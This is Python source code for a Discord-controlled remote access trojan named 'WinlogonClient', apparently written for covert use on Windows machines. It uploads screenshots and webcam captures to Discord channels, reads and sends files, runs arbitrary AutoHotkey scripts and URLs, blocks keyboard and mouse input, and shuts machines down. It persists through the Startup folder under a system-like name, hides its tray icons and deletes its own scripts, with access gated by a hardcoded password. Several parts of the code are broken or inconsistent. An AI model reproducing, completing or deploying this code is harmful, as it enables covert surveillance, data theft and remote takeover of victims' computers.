from urllib.request import urlretrieve as download
from random import randint, random

import os
from os import startfile as start
from os import remove as delete

from re import split, findall

from datetime import datetime
# import time as time_class

from discord.ext import commands
from discord import Game, Embed
import discord

import asyncio
import json


web_module_exist = True  # существование модуля для вебки
screen_module_exist = True  # существование модуля для скринов

try:
    import cv2
    import numpy as np
    import imageio
except BaseException:
    web_module_exist = False
    print("Не импортировалась библиотеку cv2/numpy/imageio")

try:
    from PIL import ImageGrab
except BaseException:
    screen_module_exist = False
    print("Не импортировалась библиотеку скринов")

from id import ID

"""
Commands:
flood, quit/exit, ping, disconnect, help/?, cls, emoji, screen, status,
oleha, mute, default, var, settings, save, path, f, folders, read, send,
update, rename, run, reload, key, ahk, mouse, sound, display, keymouse,
shutdown, minimize, demka, start, camera,

ALL_COMMANDS = ["!ahk",
                "!display",
                "!mouse",
                "!keymouse",
                "",
                "",
                ]
"""


class WinlogonClient(discord.Client):
    def __init__(self):
        super().__init__()

        class Channel:
            def __init__(self):
                self.main = client.get_channel(ID.main)
                self.back_up = client.get_channel(ID.back_up)
                self.buffer = client.get_channel(ID.buffer)
                self.index_online = client.get_channel(ID.index_online)

            @staticmethod
            def get(x):
                return client.get_channel(int(x))

        class Guild:
            def __init__(self):
                self.main = client.get_guild(ID.main)
                self.back_up = client.get_channel(ID.back_up)
                self.buffer = client.get_channel(ID.buffer)
                self.index_online = client.get_channel(ID.index_online)

            @staticmethod
            def get(x):
                return client.get_guild(int(x))

        self.channel = Channel()
        self.guild = Guild()

        self.privates = []
        self.is_privates = []
        login = os.getenv("COMPUTERNAME")  # login of PC
        self.file_name = os.path.basename(__file__)  # file_name = os.path.basename(__file__)

        login_name = os.getlogin()

        self.paths = dict()
        self.paths["APPDATA"] = os.getenv("APPDATA")
        self.paths["DESKTOP"] = f"C:\\Users\\{login_name}\\Desktop"
        self.paths["STARTUP"] = f"C:\\Users\\{login_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        self.paths["."] = os.path.dirname(__file__) + "/"
        self.paths[".file"] = os.path.dirname(__file__) + "/" + os.path.basename(__file__)

        start_up = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        os.chdir(self.paths["APPDATA"])  # Сделать папкой по умолчанию

        self.random_color = int("36393f", 16)  # Обьявить переменную
        self.MAIN_SCRIPT = False  # Главный ли скрипт
        self.RUN_STATUS = False  # Статус включения бота
        self.INDEX_STATUS = False  # ?
        self.CONNECTED_STATUS = False  # Статус включения переписки
        self.CHECKING_AFK_STATUS = False
        self.s1, self.s2 = "{", "}"  # sign first, sign second
        self.msg_status_of_users = ""

        with open(self.paths["."] + "/fruit_id.json", "r") as r:
            self.sprites_list = json.load(r)
            self.icon_url = f"https://cdn.discordapp.com/emojis/" \
                       f"{self.sprites_list['id'][randint(0, len(self.sprites_list['id']) - 1)]}.png?v=1"
            print(self.icon_url)

        self.access_to_screen = True  # Разрешение на скрины
        self.screen_delay = 100  # delay of pause
        self.lost_screen_delay = self.screen_delay

        self.users_online = 0

    async def delete_screen(self):
        # print("exist - " + str(File.exist("screen.png")))
        if File.exist("screen.png"):
            for i in range(20):
                if not File.exist("screen.png"):
                    break
                try:
                    delete("screen.png")
                except BaseException:
                    await asyncio.sleep(0.5)
                    # print("I couldn't delete screen!")
                else:
                    pass
                    # print("exist - " + str(File.exist("screen.png")))

    async def mute_screen(self):
        if self.screen_delay != 99999:
            self.screen_delay = 99999
            self.lost_screen_delay = 99999
            await self.send_embed(description="Muted!", status=False)
        else:
            screen_delay = 100
            self.lost_screen_delay = 100
            await self.send_embed(description="Unmuted!", status=False)

    async def index_online(self):
        global msg_status_of_users, INDEX_STATUS

        try:
            self.users_online = 0
            async for message in self.channel.index_online.history(limit=200):
                print(str(self.users_online) + " USERS")
                msg_time = message.created_at
                delta = datetime.utcnow() - msg_time
                delta = round(delta.total_seconds(), 0)

                if message.author.id != "492816399559819264" and message.author.id != "492655460084744203":
                    await message.delete()
                    continue

                elif message.content == login:
                    await message.delete()
                    continue

                elif delta >= 300:
                    await message.delete()
                    continue

                self.users_online += 1

            msg_status_of_users = await self.channel.index_online.send(login)
            self.users_online += 1
            print(str(self.users_online) + " USERS")
            game = Game(f"{self.users_online} users")
            await client.change_presence(status=discord.Status.dnd, activity=game)
        except BaseException:
            print("async def index_online() error")
        INDEX_STATUS = False

    @staticmethod
    def set_time(embed):
        return embed.set_footer(text=datetime.now().strftime("%d %B %H:%M:%S"))

    async def clean_screen(self):
        await self.channel.main.send("```Markdown\n#cls\n```{}\n```Markdown\n#cls\n```".format("\n" * 50))

    async def create_embed(self, description="", thumbnail="", image="", time=True, status=True):
        global self.access_to_screen
        embed = Embed(title="", description=description, colour=random_color)
        if self.icon_url:
            embed.set_author(name=login, url="", icon_url=self.icon_url)
        else:
            embed.set_author(name=login, url="")

        if self.access_to_screen and status:
            try:
                screenshot = ImageGrab.grab()
                screenshot_name = 'screen.png'
                screenshot.save(screenshot_name, 'PNG')
                urler = await client.send_file(self.channel.buffer, screenshot_name, filename=screenshot_name, content="From **{login}**".format(login=login))
                link = ""
                for i in urler.attachments:
                    link = i["url"]
                embed.set_image(url=link)
                print(link)
            except BaseException:
                pass
            client.loop.create_task(self.delete_screen())

        if time:
            embed = self.set_time(embed)
        if thumbnail:
            embed.set_thumbnail(url=thumbnail)
        if image:
            embed.set_thumbnail(url=image)
        return embed

    async def send_embed(self, description="", thumbnail="", image="", time=True, status=True):
        embed = await self.create_embed(description, thumbnail, image, time, status)
        embed = await self.channel.main.send(embed=embed)
        return embed

    async def send_settings_form(self):
        await self.send_embed(description="```python\n"
                                             f"file_name: \"{self.file_name}\"\n"
                                             f"app_data: \"{self.paths['APPDATA']}\"\n"
                                             f"start_up: \"{start_up}\"\n"
                                             f"desktop: \"C:\\Users\\{login_name}\\Desktop\""
                                             "```"
                                             f"```autohotkey\n"
                                             f"login: \"{login}\"\n"
                                             f"web_module_exist: {web_module_exist}\n"
                                             f"screen_module_exist: {screen_module_exist}\n"
                                             f"self.access_to_screen: {self.access_to_screen}\n"
                                             f"screen_delay: {screen_delay}\n"
                                             f"self.lost_screen_delay: {self.lost_screen_delay}\n"
                                             "```"
                                             ""
                                             "", status=False)

    async def edit_embed(self, later_embed, description="", thumbnail="", image="", time=True, status=True):
        embed = await self.create_embed(description, thumbnail, image, time, status)
        embed = await client.edit_message(later_embed, embed=embed)
        return embed

    async def send_file(self, filename):
        return await client.send_file(self.channel.main, filename, filename=filename,
                                      content="From **{login}**".format(login=login))

    def cut_command(self, command, string):
        try:
            string = split(command, string)
            return str(string[1])
        except BaseException:
            return False

    def check_key_dictionary(self, key, dictionary):
        for i in dictionary.keys():
            if i == key:
                return True
        return False

    @staticmethod
    def get_script(string):
        try:
            return str(split(r'```', split('```autohotkey\n', string)[1])[0])
        except BaseException:
            return False

    @staticmethod
    def if_command(command, blank):
        if command == blank or command.startswith(blank):
            return True
        return False

    """
    @staticmethod
    def if_me():
        global login
        if login == "ALEX":
            if message.author.id == ID.my_id:
                return True
            else:
                return False
    """

    #   #   #   #   #   Secret key
    @staticmethod
    async def check_secret_key(message):
        if message.channel.id == ID.musical:
            if message.content.lower() == "!get":
                for i in self.privates:
                    if message.author.id == i:
                        for a in self.is_privates:
                            if i == a:
                                return True
                        role = discord.utils.get(message.server.roles, name='win-helper')
                        await message.author.add_roles(role)
                        await self.send_embed(description="<@{}> с нами!".format(message.author.id))
                        self.is_privates.append(str(message.author.id))

    @staticmethod
    async def secret_key(message):

        if message.channel == discord.DMChannel:
            if message.content == "20140803":
                self.privates.append(str(message.author.id))
                await message.author.send("!get")
                await self.send_embed(description="<@{}> авторизовлся!".format(message.author.id))
            return True

    @staticmethod
    async def oleha(message):
        """
        TODO:
        Change the name of function, change structure of using commands
        """
        await Scripts.send_message(message, text="СЛАВА УКРАЇНІ!")

        class File:

            @staticmethod
            def append(text, path):
                with open(path, "at") as f:
                    f.write(str(text))

            @staticmethod
            def exist(path):
                try:
                    f = open(path)
                except IOError:
                    pass
                else:
                    f.close()
                    return True
                return False

            @staticmethod
            def write(text, path):
                with open(path, "wt") as f:
                    f.write(str(text))

            @staticmethod
            def read(path):
                try:
                    with open(path) as f:
                        for read in f:
                            return read
                except IOError:
                    # print("An IOError has occurred!")
                    return False

        class Explorer:

            @staticmethod
            def get_all_pages(result_string):
                if len(result_string) >= 26:
                    if len(result_string) % 26:
                        all_pages = (len(result_string) // 26) + 1
                    else:
                        all_pages = len(result_string) % 26
                    return all_pages
                else:
                    return 1

            @staticmethod
            def get_files_from_page(result_string, all_pages, this__page):

                index = (this__page - 1) * 26
                full__ans = ""
                for i in range(26):
                    try:
                        full__ans = result_string[index] if i == 0 else full__ans + "\n" + result_string[index]
                    except BaseException:
                        break
                    index += 1
                page_string = "{this_page} of {pages}".format(this_page=this__page, pages=all_pages)
                descr = str(full__ans) + "\n\n" + page_string
                return descr

            @staticmethod
            async def to_answer(full_answer, this_page=1):
                result = findall(r'(.*?)\n', full_answer)
                pages = Explorer.get_all_pages(result)
                description = Explorer.get_files_from_page(result, pages, this_page)

                embed = await self.send_embed(description=description)
                if this_page >= 2:
                    await embed.add_reaction("◀")
                await embed.add_reaction("❌")
                if this_page < pages:
                    await embed.add_reaction("▶")
                return embed

            @staticmethod
            def files_in_path(path):
                result = findall(r'\\', path)
                index_sl = len(result)

                if index_sl == 3:
                    return

                full_answer = ""
                folders_index = 0
                files_index = 0
                # все файлы в path
                for i in os.listdir(path):
                    # все папки
                    if os.path.isdir(path + i):
                        full_answer = full_answer + ":file_folder: " + i + "\n"
                        folders_index += 1

                def add_file(z, p, b, formats, transform):
                    for f in os.listdir(p):
                        if os.path.isfile(p + f):
                            if f.endswith(formats):
                                z = z + transform + f + "\n"
                                b += 1
                    return z, b

                explorer_array = file_id.json

                for i in explorer_array:
                    full_answer, files_index = add_file(full_answer, path, files_index, i[0], i[1])

                for i in os.listdir(path):
                    if os.path.isfile(path + i):
                        if i in full_answer:
                            pass
                        else:
                            files_index += 1
                            full_answer = full_answer + "<:document:530180003569336320> " + i + "\n"
                return full_answer, folders_index, files_index

        class Settings:

            @staticmethod
            def get_dictionary(settings):
                dictionary = ""
                for i in settings:
                    if "{" not in dictionary:
                        dictionary = i
                    elif "}" not in dictionary:
                        dictionary = dictionary + i
                    else:
                        break
                arg_dict = True if "{" in settings and "}" in settings else False
                return dictionary, arg_dict

            @staticmethod
            def users(settings):
                if settings:
                    dictionary, arg_dict = Settings.get_dictionary(settings)
                    try:
                        string = json.loads(dictionary)  # text
                    except BaseException:
                        return True
                    else:
                        if arg_dict is True and "u" in string.keys():
                            if type(string["u"]) == int or type(string["u"]) == float:
                                chance = string["u"] if string["u"] <= 1 else 1
                                if random() < chance:
                                    return True
                                else:
                                    return False
                            elif type(string["u"]) == list or type(string["u"]) == dict:
                                for b in string["u"]:
                                    if b == login:
                                        return True
                                return False
                            elif type(string["u"]) == str:
                                if string["u"] == login:
                                    return True
                                else:
                                    return False
                        else:
                            return True
                else:
                    return True

            @staticmethod
            def second_name(settings):
                if settings:
                    dictionary, arg_dict = Settings.get_dictionary(settings)

                    try:
                        string = json.loads(dictionary)
                    except BaseException:
                        return login
                    else:
                        if string:
                            if arg_dict:
                                for i in string.keys():
                                    if i == "name":
                                        return string["name"]
                return login

            @staticmethod
            def seconds(settings):
                if settings:
                    dictionary, arg_dict = Settings.get_dictionary(settings)

                    try:
                        string = json.loads(dictionary)
                    except BaseException:
                        return 1
                    else:
                        if string:
                            if arg_dict:
                                for i in string.keys():
                                    if i == "s":
                                        return string["s"]
                return 1

            @staticmethod
            def sound(settings):
                if settings:
                    dictionary, arg_dict = Settings.get_dictionary(settings)

                    try:
                        string = json.loads(dictionary)
                    except BaseException:
                        return "+1"
                    else:
                        if string:
                            if arg_dict:
                                for i in string.keys():
                                    if i == "z":
                                        return string["z"]
                return "+1"

            @staticmethod
            def path(settings):
                if settings:
                    dictionary, arg_dict = Settings.get_dictionary(settings)

                    try:
                        string = json.loads(dictionary)
                    except BaseException:
                        return ""
                    else:
                        if string:
                            if arg_dict:
                                for i in string.keys():
                                    if i == "p":
                                        return string["p"]
                return ""

            @staticmethod
            def change_variable(settings):
                if settings:
                    dictionary, arg_dict = Settings.get_dictionary(settings)

                    try:
                        string = json.loads(dictionary)
                    except BaseException:
                        return False
                    else:
                        if string:
                            if arg_dict:
                                for i in string.keys():
                                    if i == "default" or i == "d":
                                        self.access_to_screen = True  # Разрешение на скрины
                                        screen_delay = 100  # delay of pause
                                        self.lost_screen_delay = 100

                                    if i == "self.access_to_screen" or i == "access":
                                        self.access_to_screen = False if string[i].lower() == "false" else True

                                    elif i == "screen_delay" or i == "sd":
                                        if string[i] == "~":
                                            screen_delay = 99999
                                            self.lost_screen_delay = 99999
                                        else:
                                            screen_delay = int(string[i]) if int(string[i]) >= 10 else 10

                                    elif i == "self.lost_screen_delay" or i == "lsd":
                                        if string[i] == "~":
                                            screen_delay = 99999
                                            self.lost_screen_delay = 99999
                                        else:
                                            self.lost_screen_delay = int(string[i])
                return False

            @staticmethod
            def url(settings):
                if settings:
                    dictionary, arg_dict = Settings.get_dictionary(settings)

                    try:
                        string = json.loads(dictionary)
                    except BaseException:
                        return False
                    else:
                        if string:
                            if arg_dict:
                                for i in string.keys():
                                    if i == "url":
                                        return string["url"]
                return False

        class Scripts:

            @staticmethod
            def create_activity():
                """
                TODO:
                 read command from from activity.ahk
                """
                command = read
                try:
                    File.write(command, "activity.ahk")
                    start('activity.ahk')
                except BaseException:
                    print("Error with writing of script")

            @staticmethod
            def get_settings(content):
                # print(content)
                try:
                    command = content.split()[0]
                except BaseException:
                    return ""

                # print(command)
                second_string = self.cut_command(command, content)
                # result = split(r'\n', second_string)[0]

                return second_string

            @staticmethod
            async def ahk(script, script_name, status=True, description=""):

                if File.exist(script_name):
                    delete(script_name)
                include_code = f"""
                    #NoTrayIcon
                    #SingleInstance, Force
                    FileDelete, %A_ScriptName%
                    DetectHiddenWindows, on
                    try {s1}
                        {script}
                    {s2}
                    catch e {s1}
                        ExitApp
                    {s2}
    
                    BlockMouse()
                    {s1}
                        return DllCall("SetWindowsHookEx"
                       , Int, WH_MOUSE_LL := 14
                       , Ptr, RegisterCallback("LowLevelMouseProc", "Fast")
                       , Ptr, DllCall("GetModuleHandle", UInt, 0, Ptr)
                       , UInt, 0, Ptr)
                    {s2}
    
    
                    BlockKey()
                    {s1}
                        return DllCall("SetWindowsHookEx"
                       , Int, WH_KEYBOARD_LL := 13
                       , Ptr, RegisterCallback("LowLevelKeyboardProc", "Fast")
                       , Ptr, DllCall("GetModuleHandle", UInt, 0, Ptr)
                       , UInt, 0, Ptr)
                    {s2}
    
    
                    LowLevelMouseProc(nCode, wParam, lParam)
                    {s1}
                       Return 1
                    {s2}
    
    
                    LowLevelKeyboardProc(nCode, wParam, lParam)
                    {s1}
                       Return 1
                    {s2}
                    """
                try:
                    File.write(include_code, script_name)
                    start(script_name)

                except BaseException:
                    await self.send_embed(description="Ошибка создания скрипта.")
                else:
                    if status is False:
                        return
                    else:
                        if description:
                            await self.send_embed(description=description)
                        else:
                            try:
                                await asyncio.sleep(1)
                                await self.send_embed(description="```autohotkey\n" + str(script) + "```")
                            except BaseException:
                                pass

            @staticmethod
            async def give_reload():
                try:
                    # FileDelete, %A_AppData%\%A_ScriptName%
                    command = f"""#NoTrayIcon
                        #SingleInstance force
                        FileDelete, %A_ScriptName%
                        sleep 5000
                        Run, {self.paths['.file']}
                        ExitApp"""
                    File.write(command, "reload.ahk")
                    start('reload.ahk')
                    #  await self.send_embed(description="I am will reload.")
                except BaseException:
                    await self.send_embed(description="I have problem with reload.")
                else:
                    quit()

            @staticmethod
            async def demonstration(message):
                # settings = self.cut_command("!demka", message.content)
                embed = await self.send_embed()
                while True:
                    await embed.add_reaction("❌")
                    emoji = await client.wait_for_reaction(message=embed, user=message.author,
                                                           emoji="❌", timeout=0.1)
                    if emoji:
                        if emoji.reaction.emoji == "❌":
                            break

                    emoji = await client.wait_for_reaction(message=embed, user=message.author,
                                                           emoji="❌", timeout=2)
                    if emoji:
                        if emoji.reaction.emoji == "❌":
                            break

                    embed = await self.edit_embed(later_embed=embed)
                await embed.delete()

            @staticmethod
            async def emoji():
                if icon_url:
                    sprites = [f"<:{sprites_list['name'][i]}:{sprites_list['id'][i]}>" for i in
                               range(len(sprites_list['id']))]
                    description = ""
                    for sprite in sprites:
                        description += sprite + "\n"
                else:
                    description = "There is not smiles in data"

                await self.send_embed(description=description)

            @staticmethod
            async def help():
                description = """
                                    !ahk
                                    !connect
                                    !cls
                                    !disconnect
                                    !display
                                    !demka
                                    !keymouse
                                    !key
                                    !mouse
                                    !reload
                                    !rename
                                    !read 
                                    !update
                                    !send 
                                    !folders
                                    !f 
                                    !path
                                    !shutdown
                                    !status
                                    !sound
                                    !quit
                                    """
                await self.send_embed(description=description, status=False)

            @staticmethod
            async def send_message(message, text=""):
                if text:
                    script = "ToolTip,  {text}\nsleep 10000\nToolTip, ".format(text=text)
                else:
                    text = message.content
                    script = "MsgBox, 0, _, {text}, 10".format(text=text)
                await message.add_reaction("✔")
                await Scripts.ahk(script, "reporter.ahk", status=False)

            @staticmethod
            async def read(message):
                settings = Scripts.get_settings(message.content)
                filename = Settings.path(settings)
                string = ""
                array = []
                for line in open(filename, 'r').readlines():
                    array.append(line)
                    string = string + str(line)
                try:
                    await self.send_embed(str(string))
                except BaseException:
                    print("Ошибка со чтением")

            @staticmethod
            async def folders():
                # settings = Scripts.get_settings(message.content)
                drives = ["C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "Z:\\", "H:\\"]
                drives_existings = []
                for i in drives:
                    if os.path.exists(i):
                        drives_existings.append(i)
                        #  print(i + " существует!")
                        for a in os.listdir(i):
                            if os.path.isdir(str(i + a)):
                                #  print(a + " папка")
                                continue
                            else:
                                pass

                for i in drives_existings:
                    await self.channel.main.send(i + " " + str(len(os.listdir(i))) + " files")

            @staticmethod
            async def f(message):
                settings = Scripts.get_settings(message.content)
                path = Settings.path(settings)
                if path:
                    try:
                        full_answer, quantity_folders, index_files = Explorer.files_in_path(path)
                    except BaseException:
                        full_answer, quantity_folders, index_files = "", 0, 0
                        print("Ошибка пути")
                        description = str(full_answer) + "\n**{quantity_folders}** folders and" \
                                                         "\n**{index_files}** files in `{path}`".format(
                            quantity_folders=quantity_folders,
                            index_files=index_files,
                            path=path)
                        await self.send_embed(description=description)
                    else:
                        result = findall(r'(.*?)\n', full_answer)
                        this_page = 1
                        x = False
                        embed = await Explorer.to_answer(full_answer, this_page=this_page)
                        while x is False:
                            def check(reaction, user):
                                if user == message.author:
                                    for i in ["◀", "❌", "▶"]:
                                        if i == str(reaction.emoji):
                                            return True
                                    return False
                                else:
                                    return False

                            try:
                                reaction, user = await client.wait_for('reaction_add', timeout=60.0, check=check)
                            except asyncio.TimeoutError:
                                await message.channel.send('👎')
                            else:
                                if str(reaction) == "❌":
                                    await embed.delete()

                                if str(reaction) == "▶":
                                    this_page += 1
                                    description = Explorer.get_files_from_page(result, 2, this_page)
                                    await self.edit_embed(embed, description=description)
                                    await embed.clear_reactions()
                                    await embed.add_reaction("◀")
                                    await embed.add_reaction("❌")

                                if str(reaction) == "◀":
                                    this_page -= 1
                                    description = Explorer.get_files_from_page(result, 2, this_page)
                                    await self.edit_embed(embed, description=description)
                                    await embed.clear_reactions()
                                    await embed.add_reaction("❌")
                                    await embed.add_reaction("▶")

            @staticmethod
            async def run(message):
                settings = Scripts.get_settings(message.content)
                url = Settings.url(settings)
                if url is False:
                    await self.send_embed(description="Ошибка ссылки.")
                    return
                script = """run, {url}""".format(url=url)
                await Scripts.ahk(script, "run.ahk", description="!run {url}".format(url=url))

            @staticmethod
            async def download(message):
                settings = Scripts.get_settings(message.content)
                url = Settings.url(settings)
                if url is False:
                    await self.send_embed(description="Ошибка ссылки.")
                    return
                script = """URLDownload, {url}""".format(url=url)
                await Scripts.ahk(script, "download.ahk", description="!download {url}".format(url=url))

            @staticmethod
            async def mouse(message):
                settings = Scripts.get_settings(message.content)
                times = Settings.seconds(settings)
                script = f"""Loop {times}{s1}
                        hHookMouse := BlockMouse()
                        sleep 1000
                        {s2}
                        """
                await Scripts.ahk(script, "mouse.ahk", description=f"!mouse {times}s")

            """
            ФУНКЦІЇ ЯКИМ ПОТРІБНИЙ ДОСТУП
            """

            @staticmethod
            async def update(message):
                global msg_status_of_users
                # settings = Scripts.get_settings(message.content)
                # url = Settings.url(settings)
                url = ""
                async for a in client.logs_from(self.channel.back_up, limit=1):
                    url = a.content

                if url is False:
                    await self.send_embed(description="Ошибка обновления.")
                    return
                try:
                    script = """
                            path = %A_StartUp%/winlogon.pyw
                            FileDelete, %path%
                            URLDownloadToFile, {url}, %path%
                            """.format(url=url)
                    await Scripts.ahk(script, "update.ahk", description="!update")
                except BaseException:
                    pass
                try:
                    await msg_status_of_users.delete()
                except BaseException:
                    pass
                await message.add_reaction("👍")

                try:
                    await Scripts.reload(message)
                except BaseException:
                    await self.send_embed(description="Maybe was problem with reload.")

            @staticmethod
            async def sound(message):
                settings = Scripts.get_settings(message.content)
                time = Settings.seconds(settings)
                volume = Settings.sound(settings)
                script = """SoundSet {volume}\nSleep {times}""".format(volume=volume, times=time)
                await Scripts.ahk(script, "sound.ahk", description="!sound {volume}".format(volume=volume))

            @staticmethod
            async def create_ahk(message):
                # settings = Scripts.get_settings(message.content)
                script = self.get_script(message.content)
                print(script)
                await Scripts.ahk(script, "script.ahk")

            @staticmethod
            async def connect(message):
                global CONNECTED_STATUS
                # settings = Scripts.get_settings(message.content)
                CONNECTED_STATUS = True
                await message.add_reaction("👍")

            @staticmethod
            async def shutdown(message):
                global msg_status_of_users
                settings = Scripts.get_settings(message.content3)
                time = Settings.seconds(settings)
                script = "shutdown -s -t {time}".format(time=time)
                await msg_status_of_users.delete()
                await Scripts.ahk(script, "shutdown.ahk", status=False)
                await self.send_embed(description="I will shutdown.")

            @staticmethod
            async def minimize(message):
                global msg_status_of_users
                try:
                    # settings = Scripts.get_settings(message.content)
                    script = "WinMinimizeAll"
                    await Scripts.ahk(script, "minimize.ahk", status=False)
                    await message.add_reaction("👍")
                except BaseException:
                    print("error")

            @staticmethod
            async def display(message):
                settings = Scripts.get_settings(message.content)
                times = Settings.seconds(settings)
                script = f"""Loop {times * 5}{s1}
                SendMessage, 0x112, 0xF170, 2,, Program Manager\nsleep 200\n{s2}"""
                await Scripts.ahk(script, "display.ahk", description=f"!display {times}s")

            @staticmethod
            async def rename(message):
                global msg_status_of_users, login
                settings = Scripts.get_settings(message.content)
                name = Settings.second_name(settings)
                if len(name) <= 10:
                    login = name
                else:
                    await self.send_embed(description="Слишком длинное имя.")
                await message.add_reaction("👍")
                await self.send_embed()
                msg_status_of_users = await msg_status_of_users.edit_message(new_content=login)

            @staticmethod
            async def reload(message):
                global msg_status_of_users
                try:
                    await msg_status_of_users.delete()
                except BaseException:
                    pass
                await message.add_reaction("👍")
                await Scripts.give_reload()

            @staticmethod
            async def send(message):
                settings = Scripts.get_settings(message.content)
                path = Settings.path(settings)
                try:
                    await self.send_file(path)
                except BaseException:
                    await self.send_embed(description="Проблемы с отправкой `{}`".format(path))

            @staticmethod
            async def key(message):
                settings = Scripts.get_settings(message.content)
                times = Settings.seconds(settings)
                script = f"""Loop {times}{s1}
                        hHookKey := BlockKey()
                        sleep 1000
                        {s2}
                        """
                await Scripts.ahk(script, "key.ahk", description=f"!key {times}s")

            @staticmethod
            async def key_mouse(message):
                settings = Scripts.get_settings(message.content)
                times = Settings.seconds(settings)
                script = f"""Loop {times}{s1}
                        hHookMouse := BlockMouse()
                        hHookKey := BlockKey()
                        sleep 1000
                        {s2}
                        """
                await Scripts.ahk(script, "keymouse.ahk", description=f"!keymouse {times}s")

            @staticmethod
            async def start(message):
                settings = Scripts.get_settings(message.content)
                path = Settings.path(settings)
                if path:
                    try:
                        if path == "APPDATA":
                            start(f"C:\\Users\\{login_name}\\AppData")
                        elif path == "STARTUP":
                            start(self.paths["STARTUP"])
                        elif path == "DESKTOP":
                            start(self.paths["DESKTOP"])
                        else:
                            start(path)
                        await message.add_reaction("👍")
                    except BaseException:
                        await message.add_reaction("👎")

            @staticmethod
            async def camera():
                # settings = Scripts.get_settings(message.content)

                if not File.exist(f"{self.paths['APPDATA']}\\screens"):
                    try:
                        os.makedirs(f"{self.paths['APPDATA']}\\screens\\")
                    except BaseException:
                        pass

                for i in os.listdir(f"{self.paths['APPDATA']}\\screens"):
                    if i.endswith(".jpg"):
                        delete(f"{self.paths['APPDATA']}\\screens\\" + i)

                cap = cv2.VideoCapture(0)
                current_frame = 0

                while current_frame < 32:
                    ret, frame = cap.read()
                    # frame = cv2.flip(frame, 1)
                    cv2.waitKey(1)
                    current_frame += 1
                    if current_frame >= 3:
                        cv2.imwrite(f"{self.paths['APPDATA']}\\screens\\00{}.jpg".format(current_frame - 3), frame)

                cap.release()
                cv2.destroyAllWindows()

                names = []

                for i in os.listdir(f"{self.paths['APPDATA']}\\screens"):
                    if i.endswith(".jpg"):
                        names.append(f"{self.paths['APPDATA']}\\screens\\" + i)
                images = []

                if File.exist(f"{self.paths['APPDATA']}\\movie.gif"):
                    try:
                        delete(f"{self.paths['APPDATA']}\\movie.gif")
                    except BaseException:
                        pass

                for name in names:
                    images.append(imageio.imread(name))
                imageio.mimsave(f"{self.paths['APPDATA']}\\movie.gif", images)
                await self.send_file(f"{self.paths['APPDATA']}\\movie.gif")

    async def give_screen(self):
        if self.CHECKING_AFK_STATUS:
            try:
                Scripts.create_activity()
            except BaseException:
                pass

        while True:
            while self.lost_screen_delay >= 1:
                await asyncio.sleep(1)
                self.lost_screen_delay -= 1
            """
            if File.read("activity") != "YES":
                while True:
                    await asyncio.sleep(5)
                    if File.read("activity") == "YES":
                        break
            """
            await self.send_embed()
            self.lost_screen_delay = self.screen_delay

    def default_settings(self):
        self.access_to_screen = True  # Разрешение на скрины
        self.screen_delay = 100  # delay of pause
        self.lost_screen_delay = self.screen_delay

    async def on_ready(self):
        global RUN_STATUS, MAIN_SCRIPT, users_online, s1, s2
        print("on_ready()")
        print(login)
        ID.bot = "492655460084744203"
        self.default_settings()
        # await client.change_presence(game=Game(name=""), status='dnd')
        if login == "ALEX":
            try:
                body_time = datetime.strftime(datetime.now(), "```python\n\'%d %B %H:%M:%S\'\n```\n")
                url_back_up = await self.channel.back_up.send(content=body_time, file=self.file_name, files=self.file_name)
                link = url_back_up.attachments[0]["url"]
                await self.channel.back_up.send(link)
                # self.access_to_screen = False
            except BaseException:
                pass

        await self.send_embed(description="Запущен!")
        RUN_STATUS = True
        if await self.index_online():
            MAIN_SCRIPT = True

        client.loop.create_task(DiscordLoop.give_screen())

    """async def on_message(self, message):
        global login, RUN_STATUS, file_name, CONNECTED_STATUS, msg_status_of_users, \
            MAIN_SCRIPT, users_online, s1, s2, INDEX_STATUS
        command = message.content.lower()
        print("on_message()")
        if await Discord.secret_key(message) or await Discord.check_secret_key(message):
            return

        if message.author.id == client.user.id or RUN_STATUS is False:
            return


        # msg_time = message.timestamp
        # await asyncio.sleep(5)
        # delta = datetime.utcnow() - msg_time
        # delta = delta.total_seconds()
        # print(delta)
        # print(message.timestamp)
        # print(datetime.utcnow() - message.timestamp)


        if message.author.bot and message.channel.id != ID.index_online:
            if INDEX_STATUS:
                return
            INDEX_STATUS = True
            if await self.index_online():
                MAIN_SCRIPT = True
            return

        # SCRIPT GUARD ME
        if command.startswith("!") and login == "ALEX":
            if message.author.id != ID.my_id:
                await self.send_embed(description="Closed.", status=False)
                return

        if command.startswith("!") and command.count("!") >= 2:
            return

        if command == "!flood":
            for i in range(100):
                await self.send_embed(status=False)

        if command == "!quit" or command == "!exit":
            await self.channel.main.send("Okey :ok_hand:")
            await msg_status_of_users.delete()
            quit()

        # elif command == "!default":
        #    login = os.getenv("COMPUTERNAME")
        #    await self.send_embed(description="Login is updated. **{}**".format(login))

        elif command == "!ping":
            msg_time = message.timestamp
            delta = datetime.utcnow() - msg_time
            delta = round(delta.total_seconds(), 3)
            await self.send_embed(description="Ping {}s".format(delta), status=False)

        elif command == "!disconnect":
            CONNECTED_STATUS = False
            await message.add_reaction("👍")

        elif CONNECTED_STATUS:
            await Scripts.send_message(message)

        elif (command == "!?" or command == "!help") and (MAIN_SCRIPT or users_online == 1):
            await Scripts.help()

        elif command == "!cls":
            await self.clean_screen()

        elif command == "!emoji":
            await Scripts.emoji()

        elif command == "!screen":
            await self.send_embed()

        elif command == "!status" or command == "<:online:524700046617477151>":
            await self.send_embed()

        elif command == "<:oleha:540458464024068136>":
            await self.oleha(message)

        settings = Scripts.get_settings(message.content)

        if not Settings.users(settings):
            return

        if self.if_command(command, "!mute"):
            await self.mute_screen()

        elif self.if_command(command, "!default"):
            default_settings()
            await self.send_settings_form()

        elif self.if_command(command, "!var"):
            Settings.change_variable(settings)
            await self.send_settings_form()

        elif self.if_command(command, "!settings"):
            await self.send_settings_form()

        elif self.if_command(command, "!save"):
            await self.save_settings()

        elif command == "!path":
            await Scripts.path()

        elif command.startswith("!f "):
            await Scripts.f(message)

        elif command.startswith("!folders"):
            await Scripts.folders()

        elif command.startswith("!read "):
            await Scripts.read(message)

        elif command.startswith("!send "):
            await Scripts.send(message)

        elif command.startswith("!update"):
            await Scripts.update(message)

        elif command.startswith("!rename "):
            await Scripts.rename(message)

        elif command.startswith("!run "):
            await Scripts.run(message)

        elif command.startswith("!reload"):
            await Scripts.reload(message)

        elif self.if_command(command, "!key"):
            await Scripts.key(message)

        elif self.if_command(command, "!ahk"):
            print("!ahk")
            await Scripts.create_ahk(message)

        elif self.if_command(command, "!mouse"):
            await Scripts.mouse(message)

